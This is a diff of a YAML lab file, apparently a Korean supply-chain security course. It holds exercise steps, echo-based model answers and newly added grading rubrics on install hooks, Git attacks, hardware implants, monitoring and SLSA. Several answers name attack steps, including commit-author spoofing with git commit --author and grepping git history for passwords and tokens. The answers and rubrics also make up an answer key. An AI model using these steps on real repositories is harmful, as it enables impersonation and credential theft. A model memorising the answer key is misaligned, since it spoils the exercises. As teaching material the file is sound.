+    cmdclass override\nsetup.cfg: [options.entry_points] console_scripts\npyproject.toml: [tool.setuptools.cmdclass]\n\n[Ruby/gem]\ngemspec:
+    extensions (extconf.rb executed during install)\n\n[Detection]\n- npm: npm install --ignore-scripts
+    (safe install)\n- pip: --no-build-isolation --no-deps\n- Review source before install\n- Socket.dev:
+    Real-time package analysis\n- Snyk: Dependency vulnerability scanning'''
+  answer_detail: 패키지 설치 훅은 공급망 공격의 주요 실행 메커니즘이다. npm의 preinstall/postinstall, Python의 setup.py cmdclass,
+    Ruby의 extconf.rb가 대표적이다. --ignore-scripts 옵션으로 훅 실행을 차단할 수 있지만, 일부 패키지는 네이티브 모듈 빌드에 필수적이다. Socket.dev는
     패키지 행위를 실시간 분석한다.
   verify:
     type: output_contains
     expect: Package Install Hook
     field: stdout
+    semantic:
+      intent: '패키지 install hook 분석 — npm: scripts.preinstall/postinstall 검사 (DANGEROUS) / Python: setup.py
+        cmdclass + setup.cfg entry_points + pyproject.toml / Ruby: extconf.rb. 방어: npm install --ignore-scripts
+        + pip --no-build-isolation --no-deps + 소스 리뷰 + Socket.dev 실시간 분석 + Snyk 스캔.'
+      success_criteria:
+      - Package Install Hook 키워드
+      - npm + Python + Ruby 3 언어
+      - 방어 (--ignore-scripts) 명시
+      acceptable_methods:
+      - npm pack + 분석
+      - pip download + 분석
+      - Socket.dev / Snyk
+      negative_signs:
+      - 언어 1개만
+      - 방어 없음
+      - 검사 방법 없음
   target_vm: attacker
 - order: 11
   instruction: Git 리포지토리 공격을 분석하라. 커밋 위조, 브랜치 보호 우회, 시크릿 유출 등 Git 기반 공격을 정리하라.
   hint: git commit --author 위조, force push, 히스토리 내 시크릿 검색을 다룬다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== Git Repository Attacks ===\n\n[1] Commit Author Spoofing\ngit commit --author="Linus Torvalds <torvalds@linux.org>"\n- No authentication for commit author\n- Defense: GPG-signed
-    commits (git commit -S)\n\n[2] History Rewriting\ngit push --force: Overwrite protected history\n- Defense: Branch protection rules\n\n[3] Secret Scanning\ngit log -p | grep -iE "(password|api.key|secret|token)"\ntrufflehog
-    git file://./\n- Secrets persist even after deletion (in git history)\n\n[4] Malicious Git Hooks\n.git/hooks/pre-commit: Execute on commit\n- Defense: Don\''t clone from untrusted sources\n\n[5] Submodule
-    Attacks\ngit submodule pointing to attacker repo\n- Defense: Verify submodule URLs\n\n[Defense Tools]\n- gitleaks, trufflehog: Secret scanning\n- git-secrets: Pre-commit hook for AWS keys\n- GPG signing:
-    Commit authenticity'''
-  answer_detail: Git은 분산 버전 관리의 유연성 때문에 다양한 공격에 노출된다. 커밋 작성자는 인증 없이 변경 가능하므로 GPG 서명이 필수적이다. 히스토리에 한 번 커밋된 시크릿은 rebase/force push 후에도 복구 가능하다. trufflehog, gitleaks로 시크릿을 스캔하고, git-secrets로 커밋 전 차단해야 한다.
+  answer: 'echo -e ''=== Git Repository Attacks ===\n\n[1] Commit Author Spoofing\ngit commit --author="Linus
+    Torvalds <torvalds@linux.org>"\n- No authentication for commit author\n- Defense: GPG-signed commits
+    (git commit -S)\n\n[2] History Rewriting\ngit push --force: Overwrite protected history\n- Defense:
+    Branch protection rules\n\n[3] Secret Scanning\ngit log -p | grep -iE "(password|api.key|secret|token)"\ntrufflehog
+    git file://./\n- Secrets persist even after deletion (in git history)\n\n[4] Malicious Git Hooks\n.git/hooks/pre-commit:
+    Execute on commit\n- Defense: Don\''t clone from untrusted sources\n\n[5] Submodule Attacks\ngit submodule
+    pointing to attacker repo\n- Defense: Verify submodule URLs\n\n[Defense Tools]\n- gitleaks, trufflehog:
+    Secret scanning\n- git-secrets: Pre-commit hook for AWS keys\n- GPG signing: Commit authenticity'''
+  answer_detail: Git은 분산 버전 관리의 유연성 때문에 다양한 공격에 노출된다. 커밋 작성자는 인증 없이 변경 가능하므로 GPG 서명이 필수적이다. 히스토리에 한 번
+    커밋된 시크릿은 rebase/force push 후에도 복구 가능하다. trufflehog, gitleaks로 시크릿을 스캔하고, git-secrets로 커밋 전 차단해야 한다.
   verify:
     type: output_contains
     expect: Git Repository Attacks
     field: stdout
+    semantic:
+      intent: 'Git 공격 — [1] git commit --author 위조 (인증 X) → GPG-signed commits (-S) / [2] force push 히스토리
+        재작성 → 브랜치 보호 / [3] git log -p secret 검색 → trufflehog/gitleaks (히스토리 영구 잔존) / [4] 악성 .git/hooks/pre-commit
+        / [5] Submodule 공격. 방어: GPG + git-secrets + gitleaks. CWE-200.'
+      success_criteria:
+      - Git Repository Attacks 키워드
+      - 공격 4개 이상
+      - GPG signing + 시크릿 스캔 도구
+      acceptable_methods:
+      - GPG signing + gitleaks
+      - trufflehog + git-secrets
+      - Sigstore gitsign
+      negative_signs:
+      - 공격 2개 이하
+      - GPG 없음
+      - 스캔 도구 없음
   target_vm: attacker
 - order: 12
   instruction: 하드웨어 공급망 공격을 분석하라. 펌웨어 변조, 하드웨어 임플란트 등의 위험성을 설명하라.
   hint: BMC, UEFI, TPM 등 하드웨어 수준의 공격 표면을 분석한다
   category: analysis
   points: 10
-  answer: 'echo -e ''=== Hardware Supply Chain Attacks ===\n\n[1] Firmware Attacks\n- UEFI rootkit: Persists across OS reinstall\n- BMC/IPMI backdoor: Out-of-band management access\n- SSD firmware: Hide
-    data in reserved areas\n\n[2] Hardware Implants\n- Modified network cards: Packet interception\n- USB implants: Keystroke injection (BadUSB)\n- Chip-level backdoors: Custom IC modifications\n\n[3] Real
-    Incidents\n- Supermicro (alleged): Bloomberg chip implant report\n- Equation Group: HDD firmware implants (NSA)\n- ShadowHammer: ASUS Live Update compromise\n\n[4] UEFI/Secure Boot\n- CosmicStrand:
-    UEFI firmware rootkit (Kaspersky 2022)\n- BlackLotus: First UEFI bootkit bypassing Secure Boot\n\n[Defense]\n- Hardware attestation (TPM)\n- Measured boot / Secure Boot\n- Firmware integrity verification\n-
-    Trusted supplier programs\n- Regular BMC/IPMI firmware updates'''
-  answer_detail: 하드웨어 공급망 공격은 가장 탐지가 어렵고 영향이 지속적이다. UEFI 루트킷은 OS 재설치 후에도 존속하고, BMC 백도어는 전원이 꺼진 상태에서도 네트워크 접근이 가능하다. TPM(Trusted Platform Module)과 Measured Boot로 부팅 체인의 무결성을 검증하는 것이 핵심 방어이다.
+  answer: 'echo -e ''=== Hardware Supply Chain Attacks ===\n\n[1] Firmware Attacks\n- UEFI rootkit: Persists
+    across OS reinstall\n- BMC/IPMI backdoor: Out-of-band management access\n- SSD firmware: Hide data
+    in reserved areas\n\n[2] Hardware Implants\n- Modified network cards: Packet interception\n- USB implants:
+    Keystroke injection (BadUSB)\n- Chip-level backdoors: Custom IC modifications\n\n[3] Real Incidents\n-
+    Supermicro (alleged): Bloomberg chip implant report\n- Equation Group: HDD firmware implants (NSA)\n-
+    ShadowHammer: ASUS Live Update compromise\n\n[4] UEFI/Secure Boot\n- CosmicStrand: UEFI firmware rootkit
+    (Kaspersky 2022)\n- BlackLotus: First UEFI bootkit bypassing Secure Boot\n\n[Defense]\n- Hardware
+    attestation (TPM)\n- Measured boot / Secure Boot\n- Firmware integrity verification\n- Trusted supplier
+    programs\n- Regular BMC/IPMI firmware updates'''
+  answer_detail: 하드웨어 공급망 공격은 가장 탐지가 어렵고 영향이 지속적이다. UEFI 루트킷은 OS 재설치 후에도 존속하고, BMC 백도어는 전원이 꺼진 상태에서도 네트워크
+    접근이 가능하다. TPM(Trusted Platform Module)과 Measured Boot로 부팅 체인의 무결성을 검증하는 것이 핵심 방어이다.
   verify:
     type: output_contains
-    expect: Hardware Supply Chain
+    expect:
+    - Hardware Supply Chain
+    - 펌웨어 변조
     field: stdout
+    semantic:
+      intent: '하드웨어 공급망 — [1] 펌웨어: UEFI rootkit(BlackLotus, CosmicStrand 2022) + BMC/IPMI 백도어 + SSD firmware
+        / [2] 하드웨어 임플란트: NIC + USB BadUSB + 칩셋 백도어 / [3] 사례: Supermicro 의혹 + Equation Group HDD(NSA) +
+        ShadowHammer ASUS / [4] 방어: TPM 증명 + Measured/Secure Boot + 펌웨어 무결성 + Trusted supplier. MITRE
+        T1542.001 System Firmware.'
+      success_criteria:
+      - Hardware Supply Chain 또는 펌웨어 키워드
+      - 공격 카테고리 2개 이상
+      - TPM/Secure Boot 방어
+      acceptable_methods:
+      - UEFI rootkit + 사례
+      - Equation Group HDD
+      - ShadowHammer ASUS
+      negative_signs:
+      - 하드웨어 공격 없음
+      - 사례 없음
+      - TPM 누락
   target_vm: attacker
 - order: 13
   instruction: 공급망 공격 탐지를 위한 모니터링 전략을 수립하라. 패키지 무결성 검증과 이상행위 탐지를 포함하라.
   hint: 의존성 잠금, 해시 검증, 빌드 재현성 등의 탐지/방어 기법을 정리한다
   category: defense
   points: 10
-  answer: 'echo -e ''=== Supply Chain Monitoring Strategy ===\n\n[Package Integrity]\n1. Lock files: package-lock.json, Pipfile.lock\n2. Hash verification: pip install --require-hashes\n3. Dependency pinning:
-    exact versions only\n4. Private registry with approved packages\n\n[Build Integrity]\n5. Reproducible builds: Same source -> same binary\n6. SLSA Level 3+: Hermetic, unforgeable provenance\n7. Build
-    log audit: Review all build steps\n\n[Runtime Detection]\n8. Unexpected network connections during build\n9. New processes spawned by package managers\n10. File system changes outside expected paths\n\n[Automated
-    Tools]\n11. Dependabot/Renovate: Auto-update with review\n12. Socket.dev: Real-time package behavior analysis\n13. Scorecard: OSS project security assessment\n14. in-toto: Supply chain layout verification'''
-  answer_detail: 공급망 모니터링은 예방과 탐지의 조합이다. 잠금 파일과 해시 검증으로 의존성 변조를 예방하고, 빌드 중 이상 행위(네트워크 연결, 프로세스 생성)를 탐지한다. SLSA(Supply-chain Levels for Software Artifacts) 프레임워크는 빌드 무결성의 성숙도를 4단계로 정의한다.
+  answer: 'echo -e ''=== Supply Chain Monitoring Strategy ===\n\n[Package Integrity]\n1. Lock files: package-lock.json,
+    Pipfile.lock\n2. Hash verification: pip install --require-hashes\n3. Dependency pinning: exact versions
+    only\n4. Private registry with approved packages\n\n[Build Integrity]\n5. Reproducible builds: Same
+    source -> same binary\n6. SLSA Level 3+: Hermetic, unforgeable provenance\n7. Build log audit: Review
+    all build steps\n\n[Runtime Detection]\n8. Unexpected network connections during build\n9. New processes
+    spawned by package managers\n10. File system changes outside expected paths\n\n[Automated Tools]\n11.
+    Dependabot/Renovate: Auto-update with review\n12. Socket.dev: Real-time package behavior analysis\n13.
+    Scorecard: OSS project security assessment\n14. in-toto: Supply chain layout verification'''
+  answer_detail: 공급망 모니터링은 예방과 탐지의 조합이다. 잠금 파일과 해시 검증으로 의존성 변조를 예방하고, 빌드 중 이상 행위(네트워크 연결, 프로세스 생성)를 탐지한다.
+    SLSA(Supply-chain Levels for Software Artifacts) 프레임워크는 빌드 무결성의 성숙도를 4단계로 정의한다.
   verify:
     type: output_contains
-    expect: Supply Chain Monitoring
+    expect:
+    - Supply Chain Monitoring
+    - SBOM
     field: stdout
+    semantic:
+      intent: 공급망 모니터링 — [Package] lock files + --require-hashes + 정확 버전 핀 + 프라이빗 레지스트리 / [Build] 재현 빌드
+        + SLSA L3+ + 빌드 로그 감사 / [Runtime] 빌드 중 unexpected 네트워크 + 신규 프로세스 + FS 변경 / [Tools] Dependabot/Renovate
+        + Socket.dev + OSSF Scorecard + in-toto.
+      success_criteria:
+      - Supply Chain Monitoring 또는 SBOM 키워드
+      - Package + Build + Runtime 3 카테고리
+      - 도구 3개 이상
+      acceptable_methods:
+      - lock + hash + reproducible builds
+      - Dependabot + Socket + Scorecard
+      - in-toto layout
+      negative_signs:
+      - 카테고리 1개
+      - 도구 1개 이하
+      - 재현 빌드 누락
   target_vm: attacker
 - order: 14
   instruction: 공급망 보안 성숙도를 SLSA 프레임워크로 평가하라. 현재 프로젝트의 SLSA 레벨을 분석하라.
   hint: SLSA Level 1~4의 요구사항을 분석하고 현재 상태를 평가한다
   category: analysis
   points: 10
-  answer: 'echo -e ''=== SLSA Maturity Assessment ===\n\n[SLSA Levels]\nLevel 1: Documentation\n- Build process documented\n- Provenance generated (who, what, when)\n\nLevel 2: Hosted Build\n- Build on
-    hosted service (GitHub Actions, etc.)\n- Provenance signed by build service\n\nLevel 3: Hardened Build\n- Hermetic build (no network during build)\n- Non-falsifiable provenance\n- Isolated build environment\n\nLevel
-    4: Full Integrity\n- Two-person review for all changes\n- Reproducible builds\n- Full dependency verification\n\n[Current Project Assessment]\n- Version control: Yes (Git) -> meets L1\n- CI/CD: GitHub
-    Actions -> meets L2\n- Hermetic build: No -> below L3\n- Reproducible: Not verified -> below L4\n\nRecommendation: Target SLSA Level 3 within 6 months'''
-  answer_detail: SLSA는 Google이 제안한 공급망 보안 프레임워크로, 4단계의 성숙도를 정의한다. Level 1은 빌드 문서화, Level 2는 호스팅된 빌드 서비스 사용, Level 3은 밀봉(hermetic) 빌드와 위조 불가능한 출처 증명, Level 4는 재현 가능한 빌드와 전체 의존성 검증을 요구한다.
+  answer: 'echo -e ''=== SLSA Maturity Assessment ===\n\n[SLSA Levels]\nLevel 1: Documentation\n- Build
+    process documented\n- Provenance generated (who, what, when)\n\nLevel 2: Hosted Build\n- Build on
+    hosted service (GitHub Actions, etc.)\n- Provenance signed by build service\n\nLevel 3: Hardened Build\n-
+    Hermetic build (no network during build)\n- Non-falsifiable provenance\n- Isolated build environment\n\nLevel
+    4: Full Integrity\n- Two-person review for all changes\n- Reproducible builds\n- Full dependency verification\n\n[Current
+    Project Assessment]\n- Version control: Yes (Git) -> meets L1\n- CI/CD: GitHub Actions -> meets L2\n-
+    Hermetic build: No -> below L3\n- Reproducible: Not verified -> below L4\n\nRecommendation: Target
+    SLSA Level 3 within 6 months'''
+  answer_detail: SLSA는 Google이 제안한 공급망 보안 프레임워크로, 4단계의 성숙도를 정의한다. Level 1은 빌드 문서화, Level 2는 호스팅된 빌드 서비스
+    사용, Level 3은 밀봉(hermetic) 빌드와 위조 불가능한 출처 증명, Level 4는 재현 가능한 빌드와 전체 의존성 검증을 요구한다.
   verify:
     type: output_contains
     expect: SLSA
     field: stdout
+    semantic:
+      intent: 'SLSA 성숙도 — L1 Documentation(빌드 문서 + provenance) + L2 Hosted Build(GitHub Actions, 서명) +
+        L3 Hardened(hermetic + non-falsifiable + isolated) + L4 Full Integrity(2인 리뷰 + reproducible +
+        의존성 검증). Google 제안. 현재 평가: VC=L1 + CI=L2 + hermetic X = below L3.'
+      success_criteria:
+      - SLSA 키워드
+      - Level 1-4 모두 설명
+      - 현재 평가 + 권장 단계
+      acceptable_methods:
+      - SLSA 4단계 + 평가
+      - OpenSSF Best Practices
+      - GUAC 그래프 분석
+      negative_signs:
+      - Level 2개 이하
+      - 평가 없음
+      - 권장 사항 없음
   target_vm: attacker
 - order: 15
   instruction: 공급망 공격 실습을 종합하여 조직의 공급망 보안 강화 로드맵을 /tmp/supply_chain_roadmap.txt에 작성하라.
@@ -292,10 +588,27 @@ steps:
     EOF
 
     cat /tmp/supply_chain_roadmap.txt'
-  answer_detail: 공급망 보안은 단계적으로 성숙도를 높여야 한다. 즉각적으로 잠금 파일과 시크릿 스캐닝을 적용하고, 단기적으로 프라이빗 레지스트리와 이미지 스캐닝을, 중기적으로 SLSA Level 2와 코드 서명을, 장기적으로 밀봉 빌드와 하드웨어 증명을 달성한다. SolarWinds와 Log4Shell 이후 공급망 보안은 모든 조직의 필수 과제가
-    되었다.
+  answer_detail: 공급망 보안은 단계적으로 성숙도를 높여야 한다. 즉각적으로 잠금 파일과 시크릿 스캐닝을 적용하고, 단기적으로 프라이빗 레지스트리와 이미지 스캐닝을, 중기적으로
+    SLSA Level 2와 코드 서명을, 장기적으로 밀봉 빌드와 하드웨어 증명을 달성한다. SolarWinds와 Log4Shell 이후 공급망 보안은 모든 조직의 필수 과제가 되었다.
   verify:
     type: output_contains
     expect: Supply Chain Security Roadmap
     field: stdout
+    semantic:
+      intent: '공급망 로드맵 — echo > /tmp/supply_chain_roadmap.txt: [Immediate 0-1m] lock + --require-hashes
+        + Dependabot + 시크릿 스캔 + GPG / [Short 1-3m] 프라이빗 레지스트리 + Trivy + SBOM + SHA 핀 + 브랜치 보호 / [Medium
+        3-6m] SLSA L2 + cosign + 빌드 강화 + 벤더 평가 + IR 플레이북 / [Long 6-12m] SLSA L3 hermetic + TPM + in-toto
+        + Red Team. SolarWinds + Log4Shell 이후.'
+      success_criteria:
+      - Supply Chain Security Roadmap 키워드
+      - 4 단계 (Immediate/Short/Medium/Long)
+      - SLSA L2/L3 단계별 목표
+      acceptable_methods:
+      - echo > 4단계 로드맵
+      - OpenSSF Scorecard 기반
+      - NIST SSDF (SP 800-218)
+      negative_signs:
+      - 단계 2개 이하
+      - 구체 항목 5개 이하
+      - SLSA 누락
   target_vm: attacker
